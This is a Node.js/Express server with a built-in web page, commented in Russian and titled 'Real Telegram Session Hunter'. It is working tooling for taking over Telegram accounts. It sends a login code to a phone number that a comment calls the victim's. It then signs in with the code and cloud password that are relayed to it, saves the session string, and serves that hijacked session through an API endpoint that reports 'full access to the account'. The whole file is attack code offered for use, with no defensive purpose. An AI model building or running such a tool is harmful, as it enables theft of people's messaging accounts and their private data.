import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// 🎯 РЕАЛЬНЫЙ ЗАХВАТ СЕССИЙ TELEGRAM
class RealSessionHunter {
  constructor() {
    this.apiId = parseInt(process.env.TELEGRAM_API_ID || '0');
    this.apiHash = process.env.TELEGRAM_API_HASH || '';
    this.activeSessions = new Map();
    this.authProcesses = new Map();
    console.log('✅ Real Session Hunter initialized');
    console.log(`🔑 API ID: ${this.apiId ? '✓ Установлен' : '✗ Отсутствует'}`);
  }

  // 🔐 Реальное начало захвата сессии
  async captureSession(sessionId, phoneNumber) {
    try {
      console.log(`🎯 Начат реальный захват сессии для: ${phoneNumber}`);
      
      // Проверяем API ключи
      if (!this.apiId || !this.apiHash) {
        throw new Error('API_ID и API_HASH не установлены. Проверьте .env файл');
      }

      // Динамический импорт telegram (чтобы избежать ошибок при запуске)
      const { TelegramClient } = await import('telegram');
      const { StringSession } = await import('telegram/sessions/index.js');

      const stringSession = new StringSession('');
      const client = new TelegramClient(stringSession, this.apiId, this.apiHash, {
        connectionRetries: 3,
        useWSS: false,
        timeout: 30000
      });

      await client.connect();

      // Отправляем код на номер жертвы
      const result = await client.sendCode({
        apiId: this.apiId,
        apiHash: this.apiHash,
        phoneNumber,
      });

      console.log(`📱 Код отправлен на ${phoneNumber}`);

      // Сохраняем процесс авторизации
      this.authProcesses.set(sessionId, {
        client,
        phoneNumber,
        phoneCodeHash: result.phoneCodeHash,
        status: 'waiting_code'
      });

      return {
        success: true,
        sessionId,
        message: `✅ Код отправлен на ${phoneNumber}. Введите код из Telegram.`,
        nextStep: 'enter_code'
      };

    } catch (error) {
      console.error('❌ Ошибка захвата сессии:', error);
      return {
        success: false,
        error: this.formatError(error)
      };
    }
  }

  // 🔐 Реальный ввод кода
  async submitCode(sessionId, code) {
    try {
      console.log(`🔐 Реальный ввод кода: ${code} для сессии: ${sessionId}`);
      
      const authProcess = this.authProcesses.get(sessionId);
      if (!authProcess) {
        return { success: false, error: 'Сессия не найдена' };
      }

      const { client, phoneNumber, phoneCodeHash } = authProcess;

      try {
        // Пытаемся войти с кодом
        const signInResult = await client.signIn({
          phoneNumber,
          phoneCode: code,
          phoneCodeHash,
        });

        console.log('✅ Успешная авторизация');

        // Сохраняем сессию
        const sessionString = client.session.save();
        
        this.activeSessions.set(sessionId, {
          client,
          sessionString,
          user: signInResult
        });

        this.authProcesses.delete(sessionId);

        return {
          success: true,
          sessionId,
          sessionString, // ⚡ РЕАЛЬНАЯ СЕССИЯ!
          user: {
            id: signInResult.id,
            firstName: signInResult.firstName,
            lastName: signInResult.lastName,
            username: signInResult.username,
            phone: signInResult.phone
          },
          message: '✅ Сессия захвачена! Полный доступ к аккаунту получен.'
        };

      } catch (signInError) {
        // Если нужен пароль
        if (signInError.errorMessage === 'SESSION_PASSWORD_NEEDED') {
          console.log('🔒 Требуется облачный пароль');
          authProcess.status = 'need_password';
          this.authProcesses.set(sessionId, authProcess);

          return {
            success: true,
            sessionId,
            message: '🔒 Требуется облачный пароль. Введите пароль от облачного хранилища.',
            nextStep: 'enter_password'
          };
        }
        throw signInError;
      }

    } catch (error) {
      console.error('❌ Ошибка ввода кода:', error);
      return {
        success: false,
        error: this.formatError(error)
      };
    }
  }

  // 🔐 Реальный ввод пароля
  async submitPassword(sessionId, password) {
    try {
      console.log(`🔐 Ввод пароля для сессии: ${sessionId}`);
      
      const authProcess = this.authProcesses.get(sessionId);
      if (!authProcess) {
        return { success: false, error: 'Сессия не найдена' };
      }

      const { client } = authProcess;

      // Входим с паролем
      const signInResult = await client.signIn({
        password: password,
      });

      console.log('✅ Успешная авторизация с паролем');

      const sessionString = client.session.save();
      
      this.activeSessions.set(sessionId, {
        client,
        sessionString,
        user: signInResult
      });

      this.authProcesses.delete(sessionId);

      return {
        success: true,
        sessionId,
        sessionString, // ⚡ РЕАЛЬНАЯ СЕССИЯ!
        user: {
          id: signInResult.id,
          firstName: signInResult.firstName,
          lastName: signInResult.lastName,
          username: signInResult.username,
          phone: signInResult.phone
        },
        message: '✅ Сессия захвачена с паролем! Полный доступ к аккаунту.'
      };

    } catch (error) {
      console.error('❌ Ошибка ввода пароля:', error);
      return {
        success: false,
        error: 'Неверный облачный пароль'
      };
    }
  }

  // 📱 Использование захваченной сессии
  async useSession(sessionId) {
    try {
      const sessionData = this.activeSessions.get(sessionId);
      if (!sessionData) {
        return { success: false, error: 'Сессия не активна' };
      }

      const { client, sessionString } = sessionData;

      // Получаем информацию о пользователе
      const me = await client.getMe();

      return {
        success: true,
        session: sessionString,
        user: me,
        message: '✅ Сессия активна. Доступ к аккаунту получен.'
      };

    } catch (error) {
      console.error('❌ Ошибка использования сессии:', error);
      return {
        success: false,
        error: this.formatError(error)
      };
    }
  }

  // 🛠️ Форматирование ошибок
  formatError(error) {
    if (error.errorMessage) {
      return error.errorMessage;
    }
    if (error.message) {
      return error.message;
    }
    return 'Неизвестная ошибка';
  }
}

// Инициализация реального охотника за сессиями
const sessionHunter = new RealSessionHunter();

// 🎯 API МАРШРУТЫ
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Real Telegram Session Hunter Active',
    activeSessions: sessionHunter.activeSessions.size,
    authProcesses: sessionHunter.authProcesses.size,
    hasApiKeys: !!(sessionHunter.apiId && sessionHunter.apiHash),
    timestamp: new Date().toISOString()
  });
});

// 🔐 Шаг 1: Начало реального захвата сессии
app.post('/api/hunt/start', async (req, res) => {
  try {
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    const sessionId = 'hunt_' + Date.now();
    const result = await sessionHunter.captureSession(sessionId, phone);
    res.json(result);
    
  } catch (error) {
    console.error('❌ Ошибка в /api/hunt/start:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Внутренняя ошибка сервера: ' + error.message 
    });
  }
});

// 🔐 Шаг 2: Реальный ввод кода
app.post('/api/hunt/submit-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    if (!sessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите код и sessionId' 
      });
    }

    const result = await sessionHunter.submitCode(sessionId, code);
    res.json(result);
    
  } catch (error) {
    console.error('❌ Ошибка в /api/hunt/submit-code:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Внутренняя ошибка сервера' 
    });
  }
});

// 🔐 Шаг 3: Реальный ввод пароля
app.post('/api/hunt/submit-password', async (req, res) => {
  try {
    const { sessionId, password } = req.body;
    
    if (!sessionId || !password) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите пароль и sessionId' 
      });
    }

    const result = await sessionHunter.submitPassword(sessionId, password);
    res.json(result);
    
  } catch (error) {
    console.error('❌ Ошибка в /api/hunt/submit-password:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Внутренняя ошибка сервера' 
    });
  }
});

// 📱 Использование реальной сессии
app.get('/api/hunt/use-session', async (req, res) => {
  try {
    const { sessionId } = req.query;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Укажите sessionId' 
      });
    }

    const result = await sessionHunter.useSession(sessionId);
    res.json(result);
    
  } catch (error) {
    console.error('❌ Ошибка в /api/hunt/use-session:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Внутренняя ошибка сервера' 
    });
  }
});

// 🏠 Главная страница
app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Real Telegram Session Hunter</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .btn { padding: 12px 24px; margin: 10px 5px; background: #dc3545; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; }
            .btn:hover { background: #c82333; }
            .btn:disabled { background: #6c757d; cursor: not-allowed; }
            .result { background: #f8f9fa; padding: 20px; margin: 20px 0; border-radius: 5px; border-left: 4px solid #dc3545; }
            .input { padding: 10px; margin: 5px; width: 200px; border: 1px solid #ddd; border-radius: 4px; }
            .status { padding: 10px; margin: 10px 0; border-radius: 5px; }
            .status.success { background: #d4edda; color: #155724; }
            .status.error { background: #f8d7da; color: #721c24; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 Real Telegram Session Hunter</h1>
            <p><strong>Реальный захват сессий Telegram аккаунтов</strong></p>
            
            <div id="status"></div>
            
            <div>
                <h3>Тестирование системы:</h3>
                <button class="btn" onclick="testHealth()">Проверить здоровье</button>
                
                <h4>Захват сессии:</h4>
                <input class="input" type="tel" id="phone" placeholder="+79123456789">
                <button class="btn" onclick="startHunt()" id="startBtn">Начать захват</button>
                
                <div id="codeSection" style="display:none; margin-top: 15px;">
                    <input class="input" type="text" id="code" placeholder="Код из Telegram">
                    <button class="btn" onclick="submitCode()" id="codeBtn">Ввести код</button>
                </div>

                <div id="passwordSection" style="display:none; margin-top: 15px;">
                    <input class="input" type="password" id="password" placeholder="Облачный пароль">
                    <button class="btn" onclick="submitPassword()" id="passwordBtn">Ввести пароль</button>
                </div>

                <div style="margin-top: 15px;">
                    <button class="btn" onclick="useSession()" id="useBtn">Использовать сессию</button>
                </div>
            </div>
            
            <div id="result" class="result"></div>
        </div>

        <script>
            let currentSessionId = '';

            async function testHealth() {
                try {
                    const response = await fetch('/health');
                    const data = await response.json();
                    showStatus(data.hasApiKeys ? '✅ API ключи установлены' : '❌ API ключи отсутствуют', data.hasApiKeys ? 'success' : 'error');
                    showResult(data);
                } catch (error) {
                    showStatus('❌ Ошибка подключения к серверу', 'error');
                }
            }

            async function startHunt() {
                const phone = document.getElementById('phone').value;
                if (!phone) return alert('Введите номер телефона');
                
                setButtonLoading('startBtn', true);
                
                try {
                    const response = await fetch('/api/hunt/start', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({phone})
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        currentSessionId = data.sessionId;
                        document.getElementById('codeSection').style.display = 'block';
                        showStatus('✅ Код отправлен на номер', 'success');
                    } else {
                        showStatus('❌ Ошибка: ' + data.error, 'error');
                    }
                    showResult(data);
                } catch (error) {
                    showStatus('❌ Ошибка сети', 'error');
                } finally {
                    setButtonLoading('startBtn', false);
                }
            }

            async function submitCode() {
                const code = document.getElementById('code').value;
                if (!code) return alert('Введите код');
                
                setButtonLoading('codeBtn', true);
                
                try {
                    const response = await fetch('/api/hunt/submit-code', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            sessionId: currentSessionId,
                            code: code
                        })
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        if (data.nextStep === 'enter_password') {
                            document.getElementById('passwordSection').style.display = 'block';
                            showStatus('✅ Код принят. Введите пароль', 'success');
                        } else {
                            showStatus('✅ Сессия захвачена!', 'success');
                        }
                    } else {
                        showStatus('❌ Ошибка: ' + data.error, 'error');
                    }
                    showResult(data);
                } catch (error) {
                    showStatus('❌ Ошибка сети', 'error');
                } finally {
                    setButtonLoading('codeBtn', false);
                }
            }

            async function submitPassword() {
                const password = document.getElementById('password').value;
                if (!password) return alert('Введите пароль');
                
                setButtonLoading('passwordBtn', true);
                
                try {
                    const response = await fetch('/api/hunt/submit-password', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            sessionId: currentSessionId,
                            password: password
                        })
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        showStatus('✅ Сессия захвачена с паролем!', 'success');
                    } else {
                        showStatus('❌ Ошибка: ' + data.error, 'error');
                    }
                    showResult(data);
                } catch (error) {
                    showStatus('❌ Ошибка сети', 'error');
                } finally {
                    setButtonLoading('passwordBtn', false);
                }
            }

            async function useSession() {
                if (!currentSessionId) return alert('Сначала захватите сессию');
                
                setButtonLoading('useBtn', true);
                
                try {
                    const response = await fetch('/api/hunt/use-session?sessionId=' + currentSessionId);
                    const data = await response.json();
                    showResult(data);
                } catch (error) {
                    showStatus('❌ Ошибка сети', 'error');
                } finally {
                    setButtonLoading('useBtn', false);
                }
            }

            function showResult(data) {
                document.getElementById('result').innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
            }

            function showStatus(message, type) {
                const statusEl = document.getElementById('status');
                statusEl.innerHTML = '<div class="status ' + type + '">' + message + '</div>';
            }

            function setButtonLoading(btnId, loading) {
                const btn = document.getElementById(btnId);
                btn.disabled = loading;
                btn.innerHTML = loading ? '⏳ Загрузка...' : btn.getAttribute('data-original-text') || btn.innerHTML;
            }

            // Сохраняем оригинальные тексты кнопок
            document.addEventListener('DOMContentLoaded', function() {
                document.getElementById('startBtn').setAttribute('data-original-text', 'Начать захват');
                document.getElementById('codeBtn').setAttribute('data-original-text', 'Ввести код');
                document.getElementById('passwordBtn').setAttribute('data-original-text', 'Ввести пароль');
                document.getElementById('useBtn').setAttribute('data-original-text', 'Использовать сессию');
                
                // Проверить здоровье при загрузке
                testHealth();
            });
        </script>
    </body>
    </html>
  `);
});

// 🔧 Обработка ошибок для стабильности
process.on('uncaughtException', (error) => {
  console.error('⚠️ Непойманное исключение:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('⚠️ Необработанный промис:', reason);
});

// 🚀 Запуск сервера
const PORT = process.env.PORT || 8080;

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Сервер запущен на порту ${PORT}`);
  console.log(`🎯 Реальный захват сессий Telegram аккаунтов`);
  console.log(`📊 Health check: http://localhost:${PORT}/health`);
  
  // Проверяем API ключи
  if (!process.env.TELEGRAM_API_ID || !process.env.TELEGRAM_API_HASH) {
    console.log('❌ ВНИМАНИЕ: TELEGRAM_API_ID и TELEGRAM_API_HASH не установлены!');
    console.log('🔧 Добавьте их в .env файл или настройки Railway');
  } else {
    console.log('✅ API ключи обнаружены');
  }
});
